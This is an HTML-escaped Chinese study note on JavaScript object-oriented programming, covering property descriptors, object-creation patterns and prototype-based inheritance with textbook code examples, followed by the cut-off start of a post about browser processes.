&lt;p&gt;[[Value]]：包含这个属性的数据值。读取属性值的时候，从这个位置读；写入属性值的时候， 把新值保存在这个位置。这个特性的默认值为 undefined。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;要修改属性默认的特性，使用 **Object.defineProperty()**方法&lt;/p&gt;
&lt;p&gt;这个方法 接收三个参数：属性所在的对象、属性的名字和一个描述符对象&lt;/p&gt;
&lt;p&gt;其中，描述符（descriptor）对象的属 性必须是：configurable、enumerable、writable 和 value。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var person = {}; 
Object.defineProperty(person, &amp;quot;name&amp;quot;, { 
 writable: false, 
 value: &amp;quot;Nicholas&amp;quot; 
}); 
alert(person.name); //&amp;quot;Nicholas&amp;quot; 
person.name = &amp;quot;Greg&amp;quot;; 
alert(person.name); //&amp;quot;Nicholas&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;访问器属性&#34;&gt;访问器属性&lt;/h4&gt;
&lt;p&gt;访问器属性不包含数据值；它们包含一对儿 getter 和 setter 函数&lt;/p&gt;
&lt;p&gt;在读取访问器属性时，会调用 getter 函数，这个函数负责返回有效的值&lt;/p&gt;
&lt;p&gt;在写入访问器属性时，会调用 setter 函数并传入新值，这个函数负责决定如何处理数据&lt;/p&gt;
&lt;p&gt;访问器属性有如下 4 个特性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[[Configurable]]：表示能否通过 delete 删除属性从而重新定义属性，能否修改属性的特 性，或者能否把属性修改为数据属性。对于直接在对象上定义的属性，这个特性的默认值为 true。&lt;/li&gt;
&lt;li&gt;[[Enumerable]]：表示能否通过 for-in 循环返回属性。对于直接在对象上定义的属性，这 个特性的默认值为 true。&lt;/li&gt;
&lt;li&gt;[[Get]]：在读取属性时调用的函数。默认值为 undefined。&lt;/li&gt;
&lt;li&gt;[[Set]]：在写入属性时调用的函数。默认值为 undefined。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;访问器属性不能直接定义，必须使用 &lt;code&gt;Object.defineProperty()&lt;/code&gt;来定义&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var book = { 
 _year: 2004, 
 edition: 1 
}; 
Object.defineProperty(book, &amp;quot;year&amp;quot;, { 
 get: function(){ 
 return this._year; 
 }, 
 set: function(newValue){ 
 if (newValue &amp;gt; 2004) { 
 this._year = newValue; 
 this.edition += newValue - 2004; 
 } 
 } 
}); 
book.year = 2005; 
alert(book.edition); //2 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;_year 前面 的下划线是一种常用的记号，用于表示只能通过对象方法访问的属性。&lt;/p&gt;
&lt;p&gt;不一定非要同时指定 getter 和 setter。只指定 getter 意味着属性是不能写，尝试写入属性会被忽略&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;定义多个属性&#34;&gt;定义多个属性&lt;/h4&gt;
&lt;p&gt;由于为对象定义多个属性的可能性很大，ECMAScript 5 又定义了一个 &lt;code&gt;Object.defineProperties()&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;这个方法接收两个对象参数：第一 个对象是要添加和修改其属性的对象，第二个对象的属性与第一个对象中要添加或修改的属性一一对 应&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var book = {};
Object.defineProperties(book, { 
    
 _year: { 
 value: 2004,
 writable:true
 }, 
 
 edition: { 
 value: 1 
 }, 
    
 year: { 
 get: function(){
 	return this._year; 
 }, 
 set: function(newValue){ 
	 if (newValue &amp;gt; 2004) { 
 		this._year = newValue; 
 		this.edition += newValue - 2004; 
 			} 
		}
	} 
}); 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上代码在 book 对象上定义了两个数据属性（_year 和 edition）和一个访问器属性（year）。&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;读取属性的特性&#34;&gt;读取属性的特性&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;Object.getOwnPropertyDescriptor()&lt;/code&gt;方法，可以取得给定属性的描述符。&lt;/p&gt;
&lt;p&gt;这个方法接收两个参数：属性所在的对象和要读取其描述符的属性名称。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var book = {}; 
Object.defineProperties(book, { 
 _year: { 
 value: 2004 
 }, 
 edition: { 
 value: 1 
 }, 
 year: { 
 get: function(){ 
 return this._year; 
 }, 
 set: function(newValue){ 
 	if (newValue &amp;gt; 2004) { 
 		this._year = newValue; 
		this.edition += newValue - 2004; 
 			} 
 		} 
 	} 
}); 

var descriptor = Object.getOwnPropertyDescriptor(book, &amp;quot;_year&amp;quot;); 

alert(descriptor.value); //2004 
alert(descriptor.configurable); //false 
alert(typeof descriptor.get); //&amp;quot;undefined&amp;quot; 
var descriptor = Object.getOwnPropertyDescriptor(book, &amp;quot;year&amp;quot;); 

alert(descriptor.value); //undefined 
alert(descriptor.enumerable); //false 
alert(typeof descriptor.get); //&amp;quot;function&amp;quot; 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于数据属性_year，value 等于最初的值，configurable 是 false，而 get 等于 undefined&lt;/p&gt;
&lt;p&gt;对于访问器属性 year，value 等于 undefined，enumerable 是 false，而 get 是一个指向 getter 函数的指针&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;创建对象&#34;&gt;&lt;strong&gt;创建对象&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;虽然 Object 构造函数或对象字面量都可以用来创建单个对象，但这些方式有个明显的缺点：使用同 一个接口创建很多对象，会产生大量的重复代码。&lt;/p&gt;
&lt;h3 id=&#34;工厂模式&#34;&gt;工厂模式&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function createPerson(name, age, job){ 
 var o = new Object(); 
 o.name = name; 
 o.age = age; 
 o.job = job; 
 o.sayName = function(){ 
 alert(this.name); 
 }; 
 return o; 
} 
var person1 = createPerson(&amp;quot;Nicholas&amp;quot;, 29, &amp;quot;Software Engineer&amp;quot;); 
var person2 = createPerson(&amp;quot;Greg&amp;quot;, 27, &amp;quot;Doctor&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;工厂模式虽然解决了创建 多个相似对象的问题，但却没有解决对象识别的问题&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;构造函数模式&#34;&gt;构造函数模式&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(name, age, job){ 
 this.name = name; 
 this.age = age; 
 this.job = job; 
 this.sayName = function(){ 
 alert(this.name); 
 }; 
} 

var person1 = new Person(&amp;quot;Nicholas&amp;quot;, 29, &amp;quot;Software Engineer&amp;quot;); 

var person2 = new Person(&amp;quot;Greg&amp;quot;, 27, &amp;quot;Doctor&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;没有显式地创建对象；&lt;/li&gt;
&lt;li&gt;直接将属性和方法赋给了 this 对象；&lt;/li&gt;
&lt;li&gt;没有 return 语句。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;要创建 Person 的新实例，必须使用 new 操作符。&lt;/p&gt;
&lt;p&gt;以这种方式调用构造函数实际上会经历以下 4 个步骤：&lt;/p&gt;
&lt;p&gt;(1) 创建一个新对象；&lt;/p&gt;
&lt;p&gt;(2) 将构造函数的作用域赋给新对象（因此 this 就指向了这个新对象）；&lt;/p&gt;
&lt;p&gt;(3) 执行构造函数中的代码（为这个新对象添加属性）；&lt;/p&gt;
&lt;p&gt;(4) 返回新对象。&lt;/p&gt;
&lt;p&gt;​	&lt;br&gt;&lt;/p&gt;
&lt;p&gt;person1 和 person2 分别保存着 Person 的一个不同的实例。这两个对象都 有一个 constructor（构造函数）属性，该属性指向 Person&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(person1.constructor == Person); //true 
alert(person2.constructor == Person); //true 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;创建自定义的构造函数意味着将来可以将它的实例标识为一种特定的类型；而这正是构造函数模式 胜过工厂模式的地方。&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;将构造函数当作函数&#34;&gt;将构造函数当作函数&lt;/h4&gt;
&lt;p&gt;任何函数，只要通过 new 操作符来调用，那它就可以作为构造函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 当作构造函数使用
var person = new Person(&amp;quot;Nicholas&amp;quot;, 29, &amp;quot;Software Engineer&amp;quot;); 
person.sayName(); //&amp;quot;Nicholas&amp;quot; 

// 作为普通函数调用
Person(&amp;quot;Greg&amp;quot;, 27, &amp;quot;Doctor&amp;quot;); // 添加到 window 
window.sayName(); //&amp;quot;Greg&amp;quot; 

// 在另一个对象的作用域中调用
var o = new Object(); 
Person.call(o, &amp;quot;Kristen&amp;quot;, 25, &amp;quot;Nurse&amp;quot;); 
o.sayName(); //&amp;quot;Kristen&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;构造函数的问题&#34;&gt;构造函数的问题&lt;/h4&gt;
&lt;p&gt;使用构造函数的主要问题，就是每个方法都要在每个 实例上重新创建一遍。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;this.sayName = new Function(&amp;quot;alert(this.name)&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从这个角度上来看构造函数，更容易明白每个 Person 实例都包含一个不同的 Function 实例&lt;/p&gt;
&lt;p&gt;通过把函数定义转移到构造函数外 部来解决这个问题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(name, age, job){ 
 this.name = name; 
 this.age = age; 
 this.job = job; 
 this.sayName = sayName; 
} 

function sayName(){ 
 alert(this.name); 
} 

var person1 = new Person(&amp;quot;Nicholas&amp;quot;, 29, &amp;quot;Software Engineer&amp;quot;); 
var person2 = new Person(&amp;quot;Greg&amp;quot;, 27, &amp;quot;Doctor&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可是新问题又来了：在全局作用域中定义的函数实际上只 能被某个对象调用，这让全局作用域有点名不副实。&lt;/p&gt;
&lt;p&gt;如果对象需要定义很多方 法，那么就要定义很多个全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。&lt;/p&gt;
&lt;p&gt;好在， 这些问题可以通过使用原型模式来解决。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;原型模式&#34;&gt;原型模式&lt;/h3&gt;
&lt;h4 id=&#34;理解原型&#34;&gt;理解原型&lt;/h4&gt;
&lt;p&gt;我们创建的每个函数都有一个 prototype（原型）属性，这个属性是一个指针，指向一个对象&lt;/p&gt;
&lt;p&gt;使用原型对象的好处是可以 让所有对象实例共享它所包含的属性和方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(){ 
} 
Person.prototype.name = &amp;quot;Nicholas&amp;quot;; 
Person.prototype.age = 29; 
Person.prototype.job = &amp;quot;Software Engineer&amp;quot;; 
Person.prototype.sayName = function(){ 
 alert(this.name); 
}; 

var person1 = new Person(); 
person1.sayName(); //&amp;quot;Nicholas&amp;quot; 
var person2 = new Person();
person2.sayName(); //&amp;quot;Nicholas&amp;quot; 
alert(person1.sayName == person2.sayName); //true 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以通过 isPrototypeOf()方法来确定对象之 间关系&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(Person.prototype.isPrototypeOf(person1)); //true 
alert(Person.prototype.isPrototypeOf(person2)); //true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ECMAScript 5 增加了一个新方法，叫 Object.getPrototypeOf()&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(Object.getPrototypeOf(person1) == Person.prototype); //true 
alert(Object.getPrototypeOf(person1).name); //&amp;quot;Nicholas&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;虽然可以通过对象实例访问保存在原型中的值，但却不能通过对象实例重写原型中的值。&lt;/p&gt;
&lt;p&gt;如果我们 在实例中添加了一个属性，而该属性与实例原型中的一个属性同名，那我们就在实例中创建该属性，该 属性将会屏蔽原型中的那个属性。&lt;/p&gt;
&lt;p&gt;添加同名属性只会阻止我们访问原型中的那个属性，但不会修改原型中的属性。&lt;/p&gt;
&lt;p&gt;使用 delete 操作符则可以完全删 除实例属性，从而让我们能够重新访问原型中的属性&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(){ 
} 
Person.prototype.name = &amp;quot;Nicholas&amp;quot;; 
Person.prototype.age = 29; 
Person.prototype.job = &amp;quot;Software Engineer&amp;quot;; 
Person.prototype.sayName = function(){ 
 alert(this.name); 
}; 
var person1 = new Person(); 
var person2 = new Person(); 
person1.name = &amp;quot;Greg&amp;quot;; 
alert(person1.name); //&amp;quot;Greg&amp;quot;——来自实例
alert(person2.name); //&amp;quot;Nicholas&amp;quot;——来自原型
delete person1.name; 
alert(person1.name); //&amp;quot;Nicholas&amp;quot;——来自原型
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过使用 &lt;code&gt;hasOwnProperty()&lt;/code&gt;方法，什么时候访问的是实例属性，什么时候访问的是原型属性就 一清二楚了&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;原型与in操作符&#34;&gt;原型与in操作符&lt;/h4&gt;
&lt;p&gt;有两种方式使用 in 操作符：&lt;/p&gt;
&lt;p&gt;单独使用&lt;/p&gt;
&lt;p&gt;&lt;code&gt;alert(&amp;quot;name&amp;quot; in person1);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当该属性存在于实例中还是存在于原型中，调用&lt;code&gt;&amp;quot;name&amp;quot; in person1&lt;/code&gt;都返回 true，&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;for-in 循环中使用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;for( let i in person)
{
	alert(person[i])
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在使用 for-in 循环时，返回的是所有能够通过对象访问的、可枚举的（enumerated）属性，其中 &lt;strong&gt;既包括存在于实例中的属性，也包括存在于原型中的属性&lt;/strong&gt;。屏蔽了原型中不可枚举属性&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;原型的动态性&#34;&gt;原型的动态性&lt;/h4&gt;
&lt;p&gt;我们对原型对象所做的任何修改都能够立即从实例上 反映出来——即使是先创建了实例后修改原型也照样如此&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var friend = new Person(); 
Person.prototype.sayHi = function(){ 
 alert(&amp;quot;hi&amp;quot;); 
}; 
friend.sayHi(); //&amp;quot;hi&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;原型存在的问题&#34;&gt;原型存在的问题&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Person.prototype = { 
 constructor: Person, 
 name : &amp;quot;Nicholas&amp;quot;, 
 age : 29, 
 job : &amp;quot;Software Engineer&amp;quot;, 
 friends : [&amp;quot;Shelby&amp;quot;, &amp;quot;Court&amp;quot;],  //数组
 sayName : function () { 
 alert(this.name); 
 } 
}; 

var person1 = new Person(); 
var person2 = new Person(); 

person1.friends.push(&amp;quot;Van&amp;quot;); 

alert(person1.friends); //&amp;quot;Shelby,Court,Van&amp;quot; 
alert(person2.friends); //&amp;quot;Shelby,Court,Van&amp;quot; 
alert(person1.friends === person2.friends); //true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;像这种引用类型的属性共享是会造成其他实例的属性一起改变，因此改变这种弊端&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;组合使用构造函数模式和原型模式&#34;&gt;组合使用构造函数模式和原型模式&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(name, age, job){ 
 this.name = name; 
 this.age = age; 
 this.job = job; 
 this.friends = [&amp;quot;Shelby&amp;quot;, &amp;quot;Court&amp;quot;]; 
} 

Person.prototype = { 
 constructor : Person, 
 sayName : function(){ 
 alert(this.name); 
 } 
} 

var person1 = new Person(&amp;quot;Nicholas&amp;quot;, 29, &amp;quot;Software Engineer&amp;quot;); 

var person2 = new Person(&amp;quot;Greg&amp;quot;, 27, &amp;quot;Doctor&amp;quot;); 

person1.friends.push(&amp;quot;Van&amp;quot;); 

alert(person1.friends); //&amp;quot;Shelby,Count,Van&amp;quot; 
alert(person2.friends); //&amp;quot;Shelby,Count&amp;quot; 
alert(person1.friends === person2.friends); //false 
alert(person1.sayName === person2.sayName); //true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;实例属性&lt;/strong&gt;都是在&lt;strong&gt;构造函数&lt;/strong&gt;中定义的，而由所有实例&lt;strong&gt;共享的属性 constructor 和方 法&lt;/strong&gt; sayName()则是在原型中定义的。&lt;/p&gt;
&lt;p&gt;是目前在 ECMAScript 中使用最广泛、认同度最高的一种创建自 定义类型的方法&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;动态原型模式&#34;&gt;动态原型模式&lt;/h3&gt;
&lt;p&gt;可以通过 检查某个应该存在的方法是否有效，来决定是否需要初始化原型&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(name, age, job){ 
 //属性
 this.name = name; 
 this.age = age; 
 this.job = job; 
 //方法
 if (typeof this.sayName != &amp;quot;function&amp;quot;){ 
 
 Person.prototype.sayName = function(){ 
 alert(this.name); 
 }; 
 
 } 
} 

var friend = new Person(&amp;quot;Nicholas&amp;quot;, 29, &amp;quot;Software Engineer&amp;quot;); 
friend.sayName(); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里只在 &lt;code&gt;sayName()&lt;/code&gt;方法不存在的情况下，才会将它添加到原 型中。这段代码只会在初次调用构造函数时才会执行。此后，原型已经完成初始化，不需要再做什么修 改了&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;寄生构造函数模式&#34;&gt;寄生构造函数模式&lt;/h3&gt;
&lt;p&gt;这种模式 的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(name, age, job){ 
 var o = new Object(); 
 o.name = name; 
 o.age = age; 
 o.job = job; 
 o.sayName = function(){ 
 alert(this.name); 
 }; 
 return o; 
} 

var friend = new Person(&amp;quot;Nicholas&amp;quot;, 29, &amp;quot;Software Engineer&amp;quot;); 
friend.sayName(); //&amp;quot;Nicholas&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;关于寄生构造函数模式，返&lt;strong&gt;回的对象与构造函数或者与构造函数的原型属 性之间没有关系&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;稳妥构造函数模式&#34;&gt;稳妥构造函数模式&lt;/h3&gt;
&lt;p&gt;所谓稳妥对象，指的是没有公共属性，而且其方法也不引用 this 的对象。&lt;/p&gt;
&lt;p&gt;一是新创建对象的 实例方法不引用 this&lt;/p&gt;
&lt;p&gt;二是不使用 new 操作符调用构造函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Person(name, age, job){ 
 
 //创建要返回的对象
 var o = new Object(); 
 //可以在这里定义私有变量和函数
 //添加方法
 o.sayName = function(){ 
 alert(name); 
 }; 
 
 //返回对象
 return o; 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;继承&#34;&gt;继承&lt;/h2&gt;
&lt;p&gt;其实现继承主要是依靠原型链 来实现的。&lt;/p&gt;
&lt;h3 id=&#34;原型链&#34;&gt;原型链&lt;/h3&gt;
&lt;h4 id=&#34;基本模式&#34;&gt;基本模式&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function SuperType(){ 
 this.property = true; 
}

SuperType.prototype.getSuperValue = function(){ 
 return this.property; 
}; 

function SubType(){ 
 this.subproperty = false; 
} 

//继承了 SuperType 
SubType.prototype = new SuperType(); 
//加入新方法
SubType.prototype.getSubValue = function (){ 
 return this.subproperty; 
}; 

var instance = new SubType(); 
alert(instance.getSuperValue()); //true 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;instance 继承了SubType 的属性，包括&lt;strong&gt;constructor&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;constructor&lt;/strong&gt;属性指向该对象对应的构造函数&lt;/p&gt;
&lt;p&gt;instance 指向 SubType 的原型， SubType 的原型又指向 SuperType 的原型。&lt;/p&gt;
&lt;p&gt;要注意 instance.constructor 现在指向的 是 SuperType&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;确定原型和实例的关系&#34;&gt;确定原型和实例的关系&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(instance instanceof Object); //true 
alert(instance instanceof SuperType); //true 
alert(instance instanceof SubType); //true 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二种方式是使用&lt;code&gt;isPrototypeOf()&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;只要是原型链中出现过的原型，都可以说是该 原型链所派生的实例的原型，因此 &lt;code&gt;isPrototypeOf()&lt;/code&gt;方法也会返回 true，&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(Object.prototype.isPrototypeOf(instance)); //true 
alert(SuperType.prototype.isPrototypeOf(instance)); //true 
alert(SubType.prototype.isPrototypeOf(instance)); //true 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;在通过原型链实现继承时，不能使用对象字面量创建原型方法。因为这 样做就会重写原型链&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function SuperType(){ 
 this.property = true; 
} 
SuperType.prototype.getSuperValue = function(){ 
 return this.property; 
}; 
function SubType(){ 
 this.subproperty = false; 
} 
//继承了 SuperType 
SubType.prototype = new SuperType(); 
//使用字面量添加新方法，会导致上一行代码无效
SubType.prototype = { 
 getSubValue : function (){ 
 return this.subproperty; 
 }, 
 someOtherMethod : function (){ 
 return false; 
 } 
}; 
var instance = new SubType(); 
alert(instance.getSuperValue()); //error!
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;原型链的问题&#34;&gt;原型链的问题&lt;/h4&gt;
&lt;p&gt;原型链最主要的问题来自包含&lt;strong&gt;引用类型值&lt;/strong&gt;的原型&lt;/p&gt;
&lt;p&gt;解决方式如下&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;借用构造函数&#34;&gt;借用构造函数&lt;/h3&gt;
&lt;p&gt;函数只不过是在特定环境中执行代码的对象， 因此通过使用 apply()和 call()方法也可以在（将来）新创建的对象上执行构造函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function SuperType(){ 
 this.colors = [&amp;quot;red&amp;quot;, &amp;quot;blue&amp;quot;, &amp;quot;green&amp;quot;]; 
} 

function SubType(){ 
 //继承了 SuperType 
 SuperType.call(this); 
} 

var instance1 = new SubType(); 
instance1.colors.push(&amp;quot;black&amp;quot;); 
alert(instance1.colors); //&amp;quot;red,blue,green,black&amp;quot; 
var instance2 = new SubType(); 
alert(instance2.colors); //&amp;quot;red,blue,green&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;传递参数&#34;&gt;传递参数&lt;/h4&gt;
&lt;p&gt;借用构造函数有一个很大的优势，即可以在子类型构造函数中向超类型构造函 数传递参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function SuperType(name){ 
 this.name = name; 
} 
function SubType(){ 
 //继承了 SuperType，同时还传递了参数
 SuperType.call(this, &amp;quot;Nicholas&amp;quot;); 
 
 //实例属性
 this.age = 29; 
} 
var instance = new SubType(); 
alert(instance.name); //&amp;quot;Nicholas&amp;quot;; 
alert(instance.age); //29
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h4 id=&#34;借用构造函数的问题&#34;&gt;借用构造函数的问题&lt;/h4&gt;
&lt;p&gt;方法都在构造函数中定 义，因此函数复用就无从谈起了&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;组合继承&#34;&gt;组合继承&lt;/h3&gt;
&lt;p&gt;指的是将原型链和借用构造函数的 技术组合到一块，从而发挥二者之长的一种继承模式。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function SuperType(name){ 
 this.name = name; 
 this.colors = [&amp;quot;red&amp;quot;, &amp;quot;blue&amp;quot;, &amp;quot;green&amp;quot;]; 
} 

SuperType.prototype.sayName = function(){ 
 alert(this.name); 
    }; 

function SubType(name, age){ 
 //继承属性
 SuperType.call(this, name); 
 this.age = age; 
} 

//继承方法
SubType.prototype = new SuperType(); 
//完善
SubType.prototype.constructor = SubType; 

SubType.prototype.sayAge = function(){ 
 alert(this.age); 
}; 

var instance1 = new SubType(&amp;quot;Nicholas&amp;quot;, 29); 
instance1.colors.push(&amp;quot;black&amp;quot;); 
alert(instance1.colors); //&amp;quot;red,blue,green,black&amp;quot; 
instance1.sayName(); //&amp;quot;Nicholas&amp;quot;; 
instance1.sayAge(); //29 

var instance2 = new SubType(&amp;quot;Greg&amp;quot;, 27); 
alert(instance2.colors); //&amp;quot;red,blue,green&amp;quot; 
instance2.sayName(); //&amp;quot;Greg&amp;quot;; 
instance2.sayAge(); //27 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;原型式继承&#34;&gt;原型式继承&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function object(o){ 
 function F(){} 
 F.prototype = o; 
 return new F(); 
} 

var person = { 
 name: &amp;quot;Nicholas&amp;quot;, 
 friends: [&amp;quot;Shelby&amp;quot;, &amp;quot;Court&amp;quot;, &amp;quot;Van&amp;quot;] 
}; 

var anotherPerson = object(person); 
anotherPerson.name = &amp;quot;Greg&amp;quot;; 
anotherPerson.friends.push(&amp;quot;Rob&amp;quot;); 

var yetAnotherPerson = object(person); 
yetAnotherPerson.name = &amp;quot;Linda&amp;quot;; 
yetAnotherPerson.friends.push(&amp;quot;Barbie&amp;quot;); 
alert(person.friends); //&amp;quot;Shelby,Court,Van,Rob,Barbie
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;包含引用类型值的属性始终都会共享相应的值，没做到期望的效果&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;寄生式继承&#34;&gt;寄生式继承&lt;/h3&gt;
&lt;p&gt;寄生式继承的思路与寄生构造函数和工厂模式类似，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来&lt;strong&gt;增强对象&lt;/strong&gt;，最后再像真地是它做了所有工作一样返回对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function createAnother(original){ 
 var clone = object(original); //通过调用函数创建一个新对象
    
 clone.sayHi = function(){ //以某种方式来增强这个对象
 alert(&amp;quot;hi&amp;quot;); 
 }; 
    
 return clone; //返回这个对象
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;寄生组合式继承&#34;&gt;寄生组合式继承&lt;/h3&gt;
&lt;p&gt;高效率体现在它只调用了一次 SuperType 构造函数，防止了原生链和构造函数都有相同的属性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function object(o){ 
 function F(){} 
 F.prototype = o; 
 return new F(); 
} 

function inheritPrototype(subType, superType){ 
 var prototype = object(superType.prototype); //创建对象
 prototype.constructor = subType; //增强对象
 subType.prototype = prototype; //指定对象
}

function SuperType(name){ 
 this.name = name; 
 this.colors = [&amp;quot;red&amp;quot;, &amp;quot;blue&amp;quot;, &amp;quot;green&amp;quot;]; 
} 
SuperType.prototype.sayName = function(){ 
 alert(this.name); 
}; 

function SubType(name, age){ 
 SuperType.call(this, name); 
 
 this.age = age; 
} 

inheritPrototype(SubType, SuperType); 

SubType.prototype.sayAge = function(){ 
 alert(this.age); 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
"> 面向对象的程序设计</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/cong-shu-url-dao-zhan-zhe-zhong-jian-fa-liao-shi-me/"" data-c="
          &lt;p&gt;从输⼊URL到⻚⾯展⽰完整流程⽰意图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1627880380385.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
浏览器进程、渲染进程和⽹络进程的主要职责：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;浏览器进程主要负责⽤⼾交互、⼦进程管理和⽂件储存等功能。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;⽹络进程是⾯向渲染进程和浏览器进程等提供⽹络下载功能。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;渲染进程的主要职责是把从⽹络下载的HTML、JavaScript、CSS、图⽚等资源解析为可以显⽰和交互的 ⻚⾯。&lt;/p&gt;
